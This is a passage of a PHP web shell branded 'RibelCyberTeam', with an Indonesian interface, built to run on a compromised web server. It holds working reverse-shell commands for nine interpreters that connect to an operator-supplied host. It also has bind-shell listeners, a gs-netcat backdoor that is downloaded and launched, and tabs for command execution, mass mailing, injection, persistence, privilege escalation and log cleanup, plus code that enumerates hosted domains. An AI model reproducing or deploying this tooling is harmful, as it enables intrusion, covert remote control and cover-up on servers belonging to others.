        if ($m_hits) $msg .= '<pre class="mail-log">' . h(implode("\n", $m_hits)) . '</pre>';
    }
}

if (isset($_POST['shell_action'])) {
    $sa = $_POST['shell_action'];
    if ($sa === 'start_reverse') {
        ensure_dir($sh_dir);
        $lh = isset($_POST['lhost']) ? trim($_POST['lhost']) : '';
        $lp = isset($_POST['lport']) ? (int)$_POST['lport'] : 0;
        $method = isset($_POST['method']) ? $_POST['method'] : 'auto';
        if ($lh === '' || $lp < 1 || $lp > 65535) { $sh_msg = 'LHOST / LPORT tidak valid.'; } 
        else {
            $nc = which_bin('nc') ? which_bin('nc') : which_bin('ncat');
            $c  = null;
            if ($method === 'python3') { $py = "import socket,subprocess,os;s=socket.socket();s.connect(('$lh',$lp));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"; $c = "python3 -c " . escapeshellarg($py) . " 2>>" . escapeshellarg($sh_err); }
            elseif ($method === 'bash') { $c = "bash -c 'bash -i >& /dev/tcp/$lh/$lp 0>&1' 2>>" . escapeshellarg($sh_err); }
            elseif ($method === 'nc') { $ncb = $nc ? $nc : 'nc'; $c = "$ncb $lh $lp -e /bin/sh 2>>" . escapeshellarg($sh_err); }
            elseif ($method === 'perl') { $c = "perl -e 'use Socket;\$i=\"$lh\";\$p=$lp;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' 2>>" . escapeshellarg($sh_err); }
            elseif ($method === 'php') { $c = "php -r '\$sock=fsockopen(\"$lh\",$lp);exec(\"/bin/sh -i <&3 >&3 2>&3\");' 2>>" . escapeshellarg($sh_err); }
            elseif ($method === 'ruby') { $c = "ruby -rsocket -e 'f=TCPSocket.open(\"$lh\",$lp).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)' 2>>" . escapeshellarg($sh_err); }
            elseif ($method === 'socat') { $c = "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$lh:$lp 2>>" . escapeshellarg($sh_err); }
            elseif ($method === 'node') { $js = "(function(){var net=require('net'),cp=require('child_process'),sh=cp.spawn('/bin/sh',[]);var c=new net.Socket();c.connect($lp,'$lh',function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});return /a/;})()"; $c = "node -e " . escapeshellarg($js) . " 2>>" . escapeshellarg($sh_err); }
            elseif ($method === 'powershell') { $ps = "\$c=New-Object System.Net.Sockets.TCPClient('$lh',$lp);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){\$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$sb=(iex \$d 2>&1|Out-String);\$sb2=\$sb+'PS '+(pwd).Path+'> ';\$sx=([text.encoding]::ASCII).GetBytes(\$sb2);\$s.Write(\$sx,0,\$sx.Length);\$s.Flush()};\$c.Close()"; $c = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command " . escapeshellarg($ps); }
            else {
                if (which_bin('python3')) { $c = "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$lh\",$lp));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])' 2>>" . escapeshellarg($sh_err); }
                elseif (which_bin('bash')) { $c = "bash -c 'bash -i >& /dev/tcp/$lh/$lp 0>&1' 2>>" . escapeshellarg($sh_err); }
                elseif ($nc) { $c = "$nc $lh $lp -e /bin/sh 2>>" . escapeshellarg($sh_err); }
            }
            $run = "setsid sh -c " . escapeshellarg($c . " >" . $sh_log . " 2>&1") . " >/dev/null 2>&1 & echo \$!";
            $e = F('ex'); @$e($run, $o);
            $pid = isset($o[0]) ? (int)trim($o[0]) : 0;
            if ($pid > 0) { @file_put_contents($sh_pid, $pid); $sh_msg = "Reverse shell ke $lh:$lp [$method] dijalankan. PID: $pid"; }
            else { $sh_msg = "Reverse shell [$method] dijalankan (PID tidak terdeteksi)."; }
        }
    }
    if ($sa === 'start_bind') {
        ensure_dir($sh_dir);
        $bp = isset($_POST['bport']) ? (int)$_POST['bport'] : 0;
        $method = isset($_POST['bmethod']) ? $_POST['bmethod'] : 'auto';
        if ($bp < 1 || $bp > 65535) { $sh_msg = 'Bind port tidak valid.'; }
        else {
            $nc = which_bin('nc') ? which_bin('nc') : which_bin('ncat');
            $c  = null;
            if ($method === 'ncat') { $nc2 = which_bin('ncat'); if (!$nc2) $sh_msg = 'ncat tidak ada.'; else $c = "$nc2 -lvnp $bp -e /bin/sh 2>>" . escapeshellarg($sh_err); }
            elseif ($method === 'nc') { if (!$nc) $sh_msg = 'nc tidak ada.'; else $c = "$nc -lvnp $bp -e /bin/sh 2>>" . escapeshellarg($sh_err); }
            elseif ($method === 'socat') { $sc = which_bin('socat'); if (!$sc) $sh_msg = 'socat tidak ada.'; else $c = "$sc TCP-LISTEN:$bp,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane 2>>" . escapeshellarg($sh_err); }
            elseif ($method === 'python') { $py = which_bin('python3') ? which_bin('python3') : which_bin('python'); if (!$py) $sh_msg = 'python tidak ada.'; else { $code = "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(('0.0.0.0',$bp));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),f) for f in (0,1,2)];pty.spawn('/bin/bash')"; $c = "$py -c " . escapeshellarg($code) . " 2>>" . escapeshellarg($sh_err); } }
            else {
                if (!$nc) $sh_msg = 'nc / ncat tidak ada.';
                elseif (strpos($nc, 'ncat') !== false) $c = "$nc -lvnp $bp -e /bin/sh 2>>" . escapeshellarg($sh_err);
                else $c = "rm -f /tmp/.rct_b; mkfifo /tmp/.rct_b; cat /tmp/.rct_b | /bin/sh -i 2>&1 | $nc -lvnp $bp > /tmp/.rct_b";
            }
            if ($c) {
                $run = "setsid sh -c " . escapeshellarg($c . " >" . $sh_log . " 2>&1") . " >/dev/null 2>&1 & echo \$!";
                $e = F('ex'); @$e($run, $o);
                $pid = isset($o[0]) ? (int)trim($o[0]) : 0;
                if ($pid > 0) { @file_put_contents($sh_pid, $pid); $sh_msg = "Bind shell listening di port $bp [$method]. PID: $pid"; }
                else { $sh_msg = "Bind shell [$method] dijalankan."; }
            }
        }
    }
    if ($sa === 'stop_shell') {
        ensure_dir($sh_dir);
        $pid = @is_file($sh_pid) ? (int)@file_get_contents($sh_pid) : 0;
        kill_pid($pid); pkill_f('nc -e /bin/sh'); pkill_f('bash -i'); pkill_f('nc -lvnp'); pkill_f('socat TCP-LISTEN');
        @unlink($sh_pid); @unlink($sh_log); @unlink($sh_err); @rmdir($sh_dir);
        $sh_msg = 'Shell dihentikan.';
    }
    if ($sa === 'gs_download') {
        ensure_dir($gs_dir);
        if (gs_present()) $sh_msg = 'gs-netcat sudah ada.';
        elseif (gs_download_bin()) $sh_msg = 'gs-netcat diunduh.';
        else $sh_msg = 'Gagal unduh. Upload manual ke .rct_gsocket/gs-netcat.';
    }
    if ($sa === 'gs_start') {
        ensure_dir($gs_dir);
        if (!gs_present()) { $sh_msg = 'gs-netcat tidak ada. Klik Download dulu.'; } 
        else {
            $shell_path = ''; foreach (array('/bin/bash','/bin/sh','/bin/ash') as $c) { if (@is_executable($c)) { $shell_path = $c; break; } }
            if ($shell_path === '') { $sh_msg = 'Tidak ada shell di server.'; } 
            else {
                $secret = gs_get_secret(); $bin = gs_bin_path();
                $c = escapeshellarg($bin) . " -l -s " . escapeshellarg($secret) . " -i -e " . escapeshellarg($shell_path . ' -il');
                $run = "setsid sh -c " . escapeshellarg($c . " >" . $gs_log . " 2>&1") . " >/dev/null 2>&1 & echo \$!";
                $e = F('ex'); @$e($run, $o);
                $pid = isset($o[0]) ? (int)trim($o[0]) : 0;
                if ($pid > 0) { @file_put_contents($gs_pid, $pid); $sh_msg = "GSocket daemon jalan. PID: $pid\nSecret: $secret\nShell: $shell_path"; }
                else { $sh_msg = "GSocket dijalankan. Secret: $secret\nShell: $shell_path"; }
            }
        }
    }
    if ($sa === 'gs_stop') {
        ensure_dir($gs_dir);
        $pid = @is_file($gs_pid) ? (int)@file_get_contents($gs_pid) : 0;
        kill_pid($pid); pkill_f('gs-netcat'); @unlink($gs_pid); @unlink($gs_log); @rmdir($gs_dir);
        $sh_msg = 'GSocket daemon dihentikan.';
    }
    if ($sa === 'gs_rotate') {
        ensure_dir($gs_dir); @unlink($gs_secret); $new = gs_get_secret();
        $sh_msg = "Secret baru: $new\nRestart daemon agar berlaku.";
    }
}

if (isset($_GET['shell_poll'])) {
    header('Content-Type: text/plain; charset=utf-8');
    $o = @is_file($sh_log) ? @file_get_contents($sh_log) : '';
    $e = @is_file($sh_err) ? @file_get_contents($sh_err) : '';
    $p = @is_file($sh_pid) ? (int)@file_get_contents($sh_pid) : 0;
    echo "[pid] " . ($p ? $p : 'none') . "\n";
    echo "[alive] " . (pid_alive($p) ? 'yes' : 'no') . "\n";
    echo "--- stdout ---\n" . ($o ? $o : '(empty)') . "\n";
    echo "--- stderr ---\n" . ($e ? $e : '(empty)') . "\n";
    exit;
}
if (isset($_GET['gs_poll'])) {
    header('Content-Type: text/plain; charset=utf-8');
    $p = @is_file($gs_pid) ? (int)@file_get_contents($gs_pid) : 0;
    $s = @is_file($gs_secret) ? trim(@file_get_contents($gs_secret)) : '(belum dibuat)';
    $l = @is_file($gs_log) ? @file_get_contents($gs_log) : '(kosong)';
    $cmd = ($s !== '(belum dibuat)' && $s !== '') ? "gs-netcat -s $s -i" : '(no secret)';
    echo "[pid] " . ($p ? $p : 'none') . "\n";
    echo "[alive] " . (pid_alive($p) ? 'yes' : 'no') . "\n";
    echo "[arch] " . (gs_arch() ? gs_arch() : 'unknown') . "\n";
    echo "[binary] " . (gs_present() ? 'present' : 'missing') . "\n";
    echo "[secret] $s\n";
    echo "[command] $cmd\n";
    echo "--- log ---\n$l\n";
    exit;
}
if (isset($_GET['stats'])) {
    header('Content-Type: application/json; charset=utf-8');
    header('Cache-Control: no-store, no-cache, must-revalidate');
    $u = @file_get_contents('/proc/uptime'); $up = 0; if ($u) { $a = explode(' ', $u); $up = (int)$a[0]; }
    $m = @file_get_contents('/proc/meminfo'); $mt = $ma = 0;
    if ($m) {
        if (preg_match('/MemTotal:\s+(\d+)/', $m, $x)) $mt = (int)$x[1];
        if (preg_match('/MemAvailable:\s+(\d+)/', $m, $x)) $ma = (int)$x[1];
    }
    $df = @disk_free_space(__DIR__); $dt = @disk_total_space(__DIR__);
    $load = @file_get_contents('/proc/loadavg'); $load = $load ? trim($load) : '-';
    echo json_encode(array('uptime' => $up, 'uptime_h' => $up ? floor($up/3600).'h '.floor(($up%3600)/60).'m '.($up%60).'s' : '-', 'mem_total' => $mt, 'mem_avail' => $ma, 'mem_pct' => $mt > 0 ? round(($mt - $ma) / $mt * 100, 1) : 0, 'mem_used' => $mt > 0 ? ($mt - $ma) : 0, 'disk_free' => $df, 'disk_total' => $dt, 'disk_pct' => ($dt > 0 && $df !== false) ? round(($dt - $df) / $dt * 100, 1) : 0, 'load' => $load, 'ts' => time()));
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>root@RibelCyberTeam:~#</title>
<link rel="icon" href="https://cdn.shellbypass.com/images/img1.jpg" type="image/png">
<style type="text/css">
body{margin:0;padding:0;background:#0f1117;color:#d6d6d6;font-family:Tahoma,Arial,sans-serif;font-size:12px;}
.top{background:#151922;border-bottom:1px solid #2a3140;padding:14px;}
.title{font-size:18px;color:#fff;font-weight:bold;}
.muted{color:#8e99ab;}
.path{color:#7ee787;font-weight:bold;}
.wrap{padding:14px;}
.fm-table {
    table-layout: auto;
    width: 100%;
}
.fm-table th, .fm-table td {
    white-space: nowrap;
}
.fm-table .col-check {
    width: 1%;
    text-align: center;
}
.fm-table .col-small {
    width: 1%;
}
.fm-table .col-med {
    width: 1%;
}
.fm-table .col-actions {
    width: 1%;
}
.fm-table .col-actions {
    text-align: right;
}
.fm-table td.quick {
    text-align: right;
    white-space: nowrap;
}
.fm-table .col-name {
    width: auto;
    white-space: normal;
    word-break: break-all;
    min-width: 150px;
}
.box{background:#151922;border:1px solid #2a3140;padding:12px;margin-bottom:12px;border-radius:8px;}
.mail-form{padding:16px;}
.mail-form .name{font-size:14px;}
.mf-sub{color:#8e99ab;font-size:11px;margin:2px 0 14px 0;}
.mf-row{margin-bottom:12px;}
.mf-cols{display:flex;gap:12px;flex-wrap:wrap;margin-bottom:12px;}
.mf-col{flex:1;min-width:220px;}
.mf-label{display:block;color:#9fb0c7;font-size:11px;letter-spacing:.03em;text-transform:uppercase;margin-bottom:5px;}
.mail-form input[type=text]{padding:9px;}
.mail-form textarea{height:auto;padding:9px;line-height:1.5;resize:vertical;}
.mf-foot{display:flex;gap:10px;align-items:center;flex-wrap:wrap;border-top:1px solid #232b39;padding-top:12px;margin-top:4px;}
.mf-foot .btn{padding:8px 18px;font-size:12px;}
.mail-result{width:auto;border-collapse:collapse;font-size:11px;margin-top:4px;}
.mail-result td{border:none;border-bottom:1px solid #1e2735;padding:4px 10px 4px 0;}
.mail-result td.mk{color:#8e99ab;white-space:nowrap;padding-right:16px;}
.mail-warn{margin-top:10px;padding:8px 10px;background:#2a2415;border:1px solid #5c4d22;border-radius:6px;color:#e3b341;font-size:11px;}
.mail-log{background:#0f1117;border:1px solid #232b39;border-radius:6px;padding:10px;margin-top:10px;max-height:200px;overflow:auto;font-size:11px;white-space:pre-wrap;word-break:break-all;}
.path a{color:#7ee787;text-decoration:none;}
.path a:hover{text-decoration:underline;}
.quick a, .quick form{display:inline;}
.quick .btn{padding:2px 6px;font-size:10px;}
.perm-green{color:#7ee787;font-weight:bold;}
.perm-white{color:#c9d1d9;font-weight:bold;}
.msg{background:#1b2330;border:1px solid #3b4a63;color:#9ed0ff;padding:10px;margin-bottom:12px;border-radius:8px;}
input[type=text], textarea, input[type=file]{width:100%;box-sizing:border-box;background:#0f1117;color:#e6edf3;border:1px solid #30363d;padding:7px;border-radius:6px;font-size:12px;}
textarea{height:450px;font-family:Consolas,monospace;}
table{width:100%;border-collapse:collapse;}
th,td{border:1px solid #2a3140;padding:8px;vertical-align:top;}
th{background:#1b2330;color:#fff;}
tr:hover td{background:#111723;}
a{color:#79c0ff;text-decoration:none;}
a:hover{text-decoration:underline;}
.btn{display:inline-block;background:#212936;color:#fff;border:1px solid #38465c;padding:4px 8px;font-size:11px;border-radius:5px;text-decoration:none;cursor:pointer;}
.btn:hover{background:#2a3444;text-decoration:none;}
.btn-red{background:#3a1f24;border-color:#69323b;}
.btn-green{background:#1f3527;border-color:#355d42;}
.btn-yellow{background:#3a341f;border-color:#6a5f34;}
.actions a,.actions form{display:inline;}
.small-input{width:60px !important;display:inline;}
.name{color:#e6edf3;font-weight:bold;}
.dir{color:#e6edf3;font-weight:bold;}
.file{color:#e6edf3;}
.grid td{width:33%;}
.hoverbox{position:relative;display:inline-block;}
.previewbox{display:none;position:absolute;left:160px;top:0;z-index:9999;background:#0f1117;border:1px solid #38465c;padding:6px;border-radius:8px;box-shadow:0 4px 16px rgba(0,0,0,0.45);min-width:80px;}
.previewbox img{display:block;max-width:220px;max-height:220px;border-radius:4px;}
.hoverbox:hover .previewbox{display:block;}
td{overflow:visible;}
.hoverbox{position:relative;display:inline-block;}
.previewbox{display:none;position:absolute;left:160px;top:0;z-index:9999;background:#0f1117;border:1px solid #38465c;padding:8px;border-radius:8px;box-shadow:0 4px 16px rgba(0,0,0,0.45);min-width:180px;max-width:260px;}
.previewbox img{display:block;max-width:220px;max-height:220px;border-radius:6px;margin-bottom:8px;}
.hoverbox:hover .previewbox{display:block;}
.miniinfo{font-size:11px;line-height:1.5;color:#c9d1d9;}
.miniinfo b{color:#ffffff;}
.miniinfo .row{margin-bottom:2px;}
td:first-child{white-space:normal;}
td, table, .box{overflow:visible;}
table, .box{overflow:visible;}
pre{white-space:pre-wrap;word-wrap:break-word;overflow:auto;}
.cmd-row{display:flex;gap:10px;margin-top:10px;}
.cmd-row input{flex:1;font-family:Consolas,monospace;}
.quick-cmds{display:flex;flex-wrap:wrap;gap:6px;margin-top:10px;}
.quick-cmds button{padding:3px 8px;font-size:10px;}
.tabs{display:flex;gap:8px;flex-wrap:wrap;margin-top:10px;}
.tabs .btn.active{background:#20304d;border-color:#4d70b5;color:#dce6ff;}
.tab-body{display:block;}
.out{background:#0a0e14;border:1px solid #2a3140;border-radius:6px;padding:10px;color:#7ee787;font-family:Consolas,monospace;font-size:11px;max-height:280px;overflow:auto;margin-top:10px;white-space:pre-wrap;}
.form-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:10px;}
.form-grid .full{grid-column:1 / -1;}
.form-grid select, .form-grid input[type=text]{margin-bottom:6px;}
.shell-list{display:grid;gap:6px;}
.hint{font-size:11px;color:#8e99ab;margin-top:4px;}
.gs-cmd-row{display:flex;gap:6px;margin-top:6px;}
.gs-cmd-row input{font-family:Consolas,monospace;font-size:11px;}
.btn-blue{background:#1f2d40;border-color:#3a4f6e;}
</style>
</head>
<body class="login-page">
<div class="top">
    <div class="title">root@RibelCyberTeam:~#</div>
    <div class="muted" style="margin-top:6px;">
        Server: <b><?php echo h($server_name); ?></b> | Host: <?php echo h($hostname); ?> |
        IP Srv: <?php echo h($ip_server); ?> | IP You: <?php echo h($ip_remote); ?><br>
        OS: <?php echo h($uname); ?><br>
        PHP: <?php echo h(phpversion()); ?> | User: <?php echo h($self_user); ?> | Software: <?php echo h($server_software); ?><br>
        DocRoot: <?php echo h($doc_root); ?><br>
        Uptime: <span id="stat-uptime"><?php echo h($uptime_h); ?></span> | CPU: <?php echo h($cores); ?> core | Load: <span id="stat-load">-</span><br>
        RAM: <span style="color:#7ee787;" id="stat-ram"><?php echo h(format_size($mem_avail*1024)); ?></span>
            / <span id="stat-ram-total"><?php echo h(format_size($mem_total*1024)); ?></span>
            <span id="stat-ram-pct" style="color:#8e99ab;">(-)</span> free<br>
        Disk: <span style="color:#7ee787;" id="stat-disk"><?php echo h(format_size($disk_free)); ?></span>
            / <span id="stat-disk-total"><?php echo h(format_size($disk_total)); ?></span>
            <span id="stat-disk-pct" style="color:#8e99ab;">(-)</span> free<br>
        safe_mode: <span style="color:<?php echo $safe_mode ? '#ff7b72' : '#7ee787'; ?>;"><?php echo h($safe_mode || 'off'); ?></span> |
        open_basedir: <span style="color:<?php echo $open_basedir ? '#ff7b72' : '#7ee787'; ?>;"><?php echo h($open_basedir || 'off'); ?></span><br>
        TimeZone: <?php echo h($timezone); ?><br>
        Disabled: <span style="color:<?php echo ($disabled === 'none' || $disabled === '') ? '#7ee787' : '#ff7b72'; ?>; word-wrap:break-word;"><?php echo h($disabled === '' ? 'none' : $disabled); ?></span><br>
        Path: <span class="path"><?php echo breadcrumb_path($cwd_real); ?></span>
        <a href="?"><strong>[ HOME ]</strong></a> ~|~
        <a href="?logout=1" style="color:#ff7b72;"><strong>[ Logout ]</strong></a>
    </div>
</div>
<div class="wrap">
<?php if ($msg != '') { ?>
<div class="msg"><?php echo $msg; ?></div>
<?php } ?>
<?php if (isset($sh_msg) && $sh_msg != '') { ?>
<div class="msg"><?php echo h($sh_msg); ?></div>
<?php } ?>
<div class="box">
    <div class="tabs">
        <a class="btn <?php echo $tab === 'shell' ? 'active' : ''; ?>" href="?<?php echo $tab === 'shell' ? '' : 'tab=shell&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'shell' ? '&#9662;' : '&#9656;'; ?> Shell - Reverse / Bind</a>
        <a class="btn <?php echo $tab === 'gs' ? 'active' : ''; ?>" href="?<?php echo $tab === 'gs' ? '' : 'tab=gs&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'gs' ? '&#9662;' : '&#9656;'; ?> GSocket</a>
        <a class="btn <?php echo $tab === 'cmd' ? 'active' : ''; ?>" href="?<?php echo $tab === 'cmd' ? '' : 'tab=cmd&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'cmd' ? '&#9662;' : '&#9656;'; ?> Command Execution</a>
        <a class="btn <?php echo $tab === 'info' ? 'active' : ''; ?>" href="?<?php echo $tab === 'info' ? '' : 'tab=info&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'info' ? '&#9662;' : '&#9656;'; ?> Info</a>
        <a class="btn <?php echo $tab === 'upurl' ? 'active' : ''; ?>" href="?<?php echo $tab === 'upurl' ? '' : 'tab=upurl&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'upurl' ? '&#9662;' : '&#9656;'; ?> Upload URL</a>
        <a class="btn <?php echo $tab === 'domain' ? 'active' : ''; ?>" href="?<?php echo $tab === 'domain' ? '' : 'tab=domain&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'domain' ? '&#9662;' : '&#9656;'; ?> Domain Detect</a>
        <a class="btn <?php echo $tab === 'hunt' ? 'active' : ''; ?>" href="?<?php echo $tab === 'hunt' ? '' : 'tab=hunt&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'hunt' ? '&#9662;' : '&#9656;'; ?> Search &amp; Hunt</a>
        <a class="btn <?php echo $tab === 'logs' ? 'active' : ''; ?>" href="?<?php echo $tab === 'logs' ? '' : 'tab=logs&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'logs' ? '&#9662;' : '&#9656;'; ?> Logs &amp; Cleanup</a>
        <a class="btn <?php echo $tab === 'mail' ? 'active' : ''; ?>" href="?<?php echo $tab === 'mail' ? '' : 'tab=mail&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'mail' ? '&#9662;' : '&#9656;'; ?> Mailer</a>
        <a class="btn <?php echo $tab === 'inject' ? 'active' : ''; ?>" href="?<?php echo $tab === 'inject' ? '' : 'tab=inject&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'inject' ? '&#9662;' : '&#9656;'; ?> Inject</a>
        <a class="btn <?php echo $tab_ext === 'process' ? 'active' : ''; ?>" href="?<?php echo $tab_ext === 'process' ? '' : 'tab=process&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab_ext === 'process' ? '&#9662;' : '&#9656;'; ?> Processes</a>
        <a class="btn <?php echo $tab_ext === 'cron' ? 'active' : ''; ?>" href="?<?php echo $tab_ext === 'cron' ? '' : 'tab=cron&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab_ext === 'cron' ? '&#9662;' : '&#9656;'; ?> Persistence</a>
        <a class="btn <?php echo $tab_ext === 'privesc' ? 'active' : ''; ?>" href="?<?php echo $tab_ext === 'privesc' ? '' : 'tab=privesc&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab_ext === 'privesc' ? '&#9662;' : '&#9656;'; ?> Privesc</a>
    </div>
</div>
<?php
$WID_SCAN_ROOTS = '';

function wid_nslash($p) { return str_replace('\\', '/', (string)$p); }
function wid_domain_like($name) { return (bool)preg_match('/^(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z]{2,63}$/i', (string)$name); }
function wid_normalize_root($root) {
    $root = trim((string)$root); $root = trim($root, "\"'");
    if ($root === '') return '';
    if (strpos($root, '${') !== false) return '';
    $rp = @realpath($root);
    if ($rp === false || !@is_dir($rp)) return '';
    return $rp;
}
function wid_web_docroot_markers() {
    static $m = null;
    if ($m === null) $m = array('public_html','private_html','httpdocs','httpsdocs','htdocs','wwwroot','webroot','www','html','web');
    return $m;
}
function wid_account_bucket_names() {
    static $b = null;
    if ($b === null) $b = array('domains','web','sites','vhosts','subsites','httpdocs','httpsdocs');
    return $b;
}
function wid_domain_skip_home() {
    static $s = null;
    if ($s === null) $s = array('domains'=>1,'web'=>1,'sites'=>1,'vhosts'=>1,'subsites'=>1,'clients'=>1,'mail'=>1,'ssl'=>1,'tmp'=>1,'temp'=>1,'logs'=>1,'log'=>1,'cache'=>1,'caches'=>1,'backup'=>1,'backups'=>1,'public_html'=>1,'private_html'=>1,'httpdocs'=>1,'httpsdocs'=>1,'htdocs'=>1,'www'=>1,'html'=>1,'etc'=>1,'perl5'=>1,'bin'=>1,'php'=>1,'node_modules'=>1,'vendor'=>1,'sessions'=>1,'lscache'=>1);
    return $s;
}
function wid_domain_skip_nested() {
    static $s = null;
    if ($s === null) $s = array('files'=>1,'plugins'=>1,'public'=>1,'assets'=>1,'vendor'=>1,'node_modules'=>1,'cache'=>1,'caches'=>1,'tmp'=>1,'temp'=>1,'logs'=>1,'log'=>1,'mail'=>1,'ssl'=>1,'backup'=>1,'backups'=>1,'wp-admin'=>1,'wp-content'=>1,'wp-includes'=>1,'cgi-bin'=>1,'includes'=>1,'admin'=>1,'api'=>1,'cron'=>1);
    return $s;
}
function wid_hosting_docroot_domain($path) {
    static $patterns = null;
    if ($patterns === null) {
        $m = implode('|', wid_web_docroot_markers());
        $b = 'domains|web|sites|subsites';
        $patterns = array(
            '#/(?:'.$b.')/([^/]+)/(?:public_html|private_html|httpdocs|httpsdocs)$#i',
            '#/(?:vhosts|var/www/vhosts)/([^/]+)/(?:'.$m.')$#i',
            '#/(?:vhosts|var/www/vhosts)/([^/]+)$#i',
            '#/(?:'.$b.')/[^/]+/public_html/([^/]+)/(?:html|public_html|htdocs|httpdocs|wwwroot|webroot|www|web)$#i',
            '#/(?:'.$b.')/[^/]+/private_html/([^/]+)/(?:html|public_html|htdocs|httpdocs|web)$#i',
            '#/home(?:\d+)?/[^/]+/([^/]+)/(?:'.$m.')$#i',
            '#/home(?:\d+)?/[^/]+/(?:'.$b.')/([^/]+)/(?:'.$m.')$#i',
            '#/var/www/[^/]+/([^/]+)/(?:'.$m.')$#i',
            '#/var/www/[^/]+/([^/]+)$#i',
            '#/var/www/html/([^/]+)/(?:'.$m.')$#i',
            '#/var/www/html/([^/]+)$#i',
            '#/(?:srv/(?:www|http)|usr/local/www)/[^/]+/([^/]+)/(?:'.$m.')$#i',
            '#/(?:srv/(?:www|http)|usr/local/www)/[^/]+/([^/]+)$#i',
            '#/htdocs/[^/]+/([^/]+)/(?:'.$m.')$#i',
            '#/htdocs/[^/]+/([^/]+)$#i',
            '#/customers/[^/]+/([^/]+)/(?:'.$m.')$#i',
            '#/customers/[^/]+/([^/]+)$#i',
        );
    }
    $p = rtrim(wid_nslash($path), '/');
    foreach ($patterns as $pattern) {
        if (preg_match($pattern, $p, $match) && wid_domain_like($match[1])) return strtolower($match[1]);
    }
    if (wid_is_account_public_html($p) && isset($_SERVER['SERVER_NAME'])) {
        $sn = strtolower(preg_replace('/:\d+$/', '', (string)$_SERVER['SERVER_NAME']));
        if (wid_domain_like($sn)) return $sn;
    }
    return '';
}
function wid_is_account_public_html($path) {
    $p = rtrim(wid_nslash($path), '/');
    return (bool)preg_match('#/(?:home(?:\d+)?|var/www|srv/(?:www|http)|usr/local/www|htdocs|customers)/[^/]+/public_html$#i', $p);
}
function wid_is_main_public_html($path) {
    $p = rtrim(wid_nslash($path), '/');
    if (preg_match('#/(?:domains|web|sites|subsites)/[^/]+/public_html$#i', $p)) return true;
    return wid_is_account_public_html($p);
}
function wid_looks_like_webroot($dir) {
    $d = rtrim((string)$dir, '/\\');
    return @is_file($d . DIRECTORY_SEPARATOR . 'index.php')
        || @is_file($d . DIRECTORY_SEPARATOR . 'index.html')
        || @is_file($d . DIRECTORY_SEPARATOR . 'index.htm')
        || @is_file($d . DIRECTORY_SEPARATOR . 'wp-config.php')
        || @is_file($d . DIRECTORY_SEPARATOR . '.htaccess')
        || @is_file($d . DIRECTORY_SEPARATOR . 'web.config');
}
function wid_guess_domain_from_path($path) {
    $parts = explode('/', rtrim(wid_nslash($path), '/'));
    for ($i = count($parts) - 1; $i >= 0; $i--) {
        if ($parts[$i] !== '' && wid_domain_like($parts[$i])) return strtolower($parts[$i]);
    }
    return '';
}
function wid_account_home_patterns() {
    static $p = null;
    if ($p === null) $p = array('#^(/home(?:\d+)?/[^/]+)#','#^(/var/www/[^/]+)#','#^(/srv/(?:www|http)/[^/]+)#','#^(/usr/local/www/[^/]+)#','#^(/htdocs/[^/]+)#','#^(/customers/[^/]+)#');
    return $p;
}
function wid_account_home_candidates_from_path($path) {
    $out = array(); $seen = array();
    $p = rtrim(wid_nslash((string)$path), '/');
    for ($i = 0; $i < 10 && $p !== '' && $p !== '/'; $i++) {
        foreach (wid_account_home_patterns() as $pattern) {
            if (preg_match($pattern, $p, $m)) {
                $cand = $m[1];
                if (!isset($seen[$cand])) { $seen[$cand] = true; $out[] = $cand; }
            }
        }
        $parent = dirname($p);
        if ($parent === $p) break;
        $p = wid_nslash($parent);
    }
    return $out;
}
function wid_add_domain_root(&$found, $path, $source, $currentRoot, $names = array()) {
    $real = @realpath($path);
    if ($real === false || !@is_dir($real)) return;
    $key = wid_nslash($real);
    if (DIRECTORY_SEPARATOR === '\\') $key = strtolower($key);
    if (isset($found[$key])) {
        if ($source === 'current') $found[$key]['current'] = 1;
        foreach ($names as $n) {
            $n = strtolower((string)$n);
            if (wid_domain_like($n) && !in_array($n, $found[$key]['names'])) array_unshift($found[$key]['names'], $n);
        }
        if (!in_array($source, $found[$key]['source'])) $found[$key]['source'][] = $source;
        return;
    }
    $names2 = array();
    foreach ($names as $n) {
        $n = strtolower((string)$n);
